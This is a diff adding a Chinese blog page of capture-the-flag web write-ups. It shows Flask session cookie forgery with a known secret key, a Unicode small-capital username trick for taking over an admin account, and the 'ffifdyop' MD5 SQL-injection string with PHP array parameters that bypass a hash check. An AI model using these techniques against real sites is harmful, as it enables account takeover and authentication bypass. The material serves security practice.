@@ -1,0 +1,184 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>web刷题 | 墨水彩笔</title><meta name="author" content="墨水彩笔"><meta name="copyright" content="墨水彩笔"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="BUU刷题集[HCTF 2018]admin方法一：12关于flask模板https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_44190459&#x2F;article&#x2F;details&#x2F;116774912  12345678910利用flask_session_cookie_manager3工具解密1.首先register一个账户2.登录账户">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web刷题">
+<meta property="og:url" content="http://example.com/2022/07/25/web%E5%88%B7%E9%A2%98/index.html">
+<meta property="og:site_name" content="墨水彩笔">
+<meta property="og:description" content="BUU刷题集[HCTF 2018]admin方法一：12关于flask模板https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_44190459&#x2F;article&#x2F;details&#x2F;116774912  12345678910利用flask_session_cookie_manager3工具解密1.首先register一个账户2.登录账户">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2022-07-25T06:54:41.000Z">
+<meta property="article:modified_time" content="2022-07-27T10:15:42.584Z">
+<meta property="article:author" content="墨水彩笔">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/07/25/web%E5%88%B7%E9%A2%98/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2022-07-27 18:15:42'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">54</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BUU%E5%88%B7%E9%A2%98%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">BUU刷题集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">1.1.</span> <span class="toc-text">[HCTF 2018]admin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Aunicode%E6%AC%BA%E9%AA%97"><span class="toc-number">1.1.2.</span> <span class="toc-text">方法二：unicode欺骗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-number">1.2.</span> <span class="toc-text">[BJDCTF2020]Easy MD5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%80%E5%B7%A7"><span class="toc-number">1.2.1.</span> <span class="toc-text">技巧</span></a></li></ol></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">web刷题</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-07-25T06:54:41.000Z" title="Created 2022-07-25 14:54:41">2022-07-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-07-27T10:15:42.584Z" title="Updated 2022-07-27 18:15:42">2022-07-27</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="BUU刷题集"><a href="#BUU刷题集" class="headerlink" title="BUU刷题集"></a>BUU刷题集</h1><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关于flask模板</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_44190459&#x2F;article&#x2F;details&#x2F;116774912</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">利用flask_session_cookie_manager3工具解密</span><br><span class="line">1.首先register一个账户</span><br><span class="line">2.登录账户，获得该账号的Session值</span><br><span class="line">3.通过SSTI漏洞将这个session修改，伪造成admin用户登录</span><br><span class="line">python flask_session_cookie_manager3.py decode -s &quot;ckj123&quot; -c &quot;.eJxFkE-LwkAMxb_KkrOH_rEXwYMwtriQSGVqmVxEbbXGGReqIh3xu--sC7uHXPLyfo-XJ2wOfXvtYHLr7-0INqcGJk_42MEElppPlCwepFhYd5b0IgozJs8W6zJmN_cmqRIs1mej1x0qK1jnQrp8_PiMMynrypPOBeU4GG2t0bMMfbiXleWCzuirMUrw-rWwNA5d3rFqOpbAVfuYpOkoKQdy6FmVGRblGD0OKJiiJotunpEspvAawf7aHza3r3N7-a9Qf4boKjV-H2G9skbMwDq3rOYJaZNQbWJSJmZ1zJZFNYT9gOX0jTu57bH9I3G-iurZr3LZuiBAnKQwgvu17d9fgziC1zfSp2ty.Yt_yuA.5i6BkMQ1-ZrGfpL7ZiqOs3ApdWk&quot;</span><br><span class="line"></span><br><span class="line">加密session</span><br><span class="line">python flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;96b7b046ce8e52452876e1d5fa3ce60eda5a09c1ac5407b0bf7e5351c282a9ea0935db4edcd35825a35cf7f2aad7af5607567a7d26c3d490d833223713e2a962&#39;, &#39;csrf_token&#39;: b&#39;9bc257c741deb62e1ed165665f5465d898e2d121&#39;, &#39;image&#39;: b&#39;dTtX&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;&quot;</span><br><span class="line">解密后的session</span><br><span class="line">.eJxFkEGLwkAMhf_KkrOHttqL4EEYW1xIpDK1TC6ittrGGReqIh3xv--sC7uHXPLyvsfLE7bHvrm2ML3192YE266G6RM-9jCFleaOkuWDFAvr1pJeRmEm5NliVcTsFt4kZYL55mz0pkVlBatMSBePH59xZsy69KQzQTkNRltr9DxFH-5lbTmnM_pyghK8fiMstUOXtazqliVw1SEmqVtKioEcelZFinkxQY8DCo5Rk0W3SEmWM3iN4HDtj9vb17m5_FeoPkN0OTb-EGG1tkbMwDqzrBYJaZNQZWJSJmZ1Sld5OYT9gMXsjevc7tT8kThbR9X8V7nsXBBgV7vuAiO4X5v-_TeII3h9A7wxbOU.Yt_zNQ.SlnDEYDa-VjBKD89TZgmth2d3wI</span><br></pre></td></tr></table></figure>
+
+<p>在我们注册的账户上，抓包将session值改为我们得到的伪造session即可伪造登录admin账户，获得flag</p>
+<img src="/2022/07/25/web%E5%88%B7%E9%A2%98/07/25/web%E5%88%B7%E9%A2%98/image-20220726220102366.png" class title="image-20220726220102366">
+
+<h3 id="方法二：unicode欺骗"><a href="#方法二：unicode欺骗" class="headerlink" title="方法二：unicode欺骗"></a>方法二：unicode欺骗</h3><p>发现在change的时候会将账户转化，那么是不是存在一种可能我注册的是Admin，那么修改密码的时候是否存在可能账号变为admin导致我们可以修改的密码是admin的然后就可以登录admin了</p>
+<img src="/2022/07/25/web%E5%88%B7%E9%A2%98/07/25/web%E5%88%B7%E9%A2%98/image-20220725151203249.png" class title="image-20220725151203249">
+
+<p>经过尝试后发现不存在这种可能</p>
+<p>因为在我们的注册和登录时都会有strlower函数</p>
+<img src="/2022/07/25/web%E5%88%B7%E9%A2%98/07/25/web%E5%88%B7%E9%A2%98/image-20220726220710491.png" class title="image-20220726220710491">
+
+<p>但我们发现这个strlower函数好像不是库函数，时自己定义的函数</p>
+<p>那么这个函数和我们的lower有什么区别呢</p>
+<img src="/2022/07/25/web%E5%88%B7%E9%A2%98/07/25/web%E5%88%B7%E9%A2%98/image-20220726221224657.png" class title="image-20220726221224657">
+
+<p>我们发现这个函数是存在漏洞的</p>
+<p><img src="https://p1.ssl.qhimg.com/t01e6150cb114639c0d.png" alt="img"></p>
+<p>也就是说如果我们注册的时候使用ᴬᴰᴹᴵᴺ那么我们登录之后就会变成ADMIN,在修改密码的时候就会再次变成admin</p>
+<p>流程</p>
+<p>ᴬᴰᴹᴵᴺ-&gt;ADMIN-&gt;admin</p>
+<p>最终达到修改admin密码，达到登录效果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Unicode字符表</span><br><span class="line">ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘʀꜱᴛᴜᴠᴡʏᴢ</span><br><span class="line"></span><br><span class="line">这种类型的字符可以查询该网站</span><br><span class="line">https:&#x2F;&#x2F;unicode-table.com&#x2F;en&#x2F;search&#x2F;?q&#x3D;small+capital</span><br></pre></td></tr></table></figure>
+
+<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>md5（）函数的true参数</p>
+<p>存在漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop字符串会产生漏洞</span><br><span class="line">在本地环境试验ffifdyop，输出的开头是’or’6xxxxxx</span><br><span class="line">在数据库语句里就构成了select * from ‘admin’ where password&#x3D; &#39;&#39;or’6xxxxxx ’ 相当于 password&#x3D; ‘’ or 1 变成永真式</span><br></pre></td></tr></table></figure>
+
+<p>那么就会进入下面的页面</p>
+<img src="/2022/07/25/web%E5%88%B7%E9%A2%98/07/25/web%E5%88%B7%E9%A2%98/image-20220727162700669.png" class title="image-20220727162700669">
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exp:</span><br><span class="line">http:&#x2F;&#x2F;3730c468-70aa-42e4-b7b4-cef8e59fc49a.node4.buuoj.cn:81&#x2F;levels91.php?a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/25/web%E5%88%B7%E9%A2%98/07/25/web%E5%88%B7%E9%A2%98/image-20220727163046071.png" class title="image-20220727163046071">
+
+<p>这里使用post型提交</p>
+<h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以用结果等于0exxxxxx的字符串（对于本题不适用，因为0的多少次方都是0，导致第一个条件不成立）</span><br><span class="line">也可以使用数组</span><br><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2；php语法规定md5只不能加密数组，加密数组就会返回空值，空值就与空值相等了</span><br></pre></td></tr></table></figure>
+
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">墨水彩笔</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/07/25/web%E5%88%B7%E9%A2%98/">http://example.com/2022/07/25/web%E5%88%B7%E9%A2%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/07/27/Docker%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Docker安装记录</div></div></a></div><div class="next-post pull-right"><a href="/2022/07/19/web%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">web学习心得</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 墨水彩笔</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
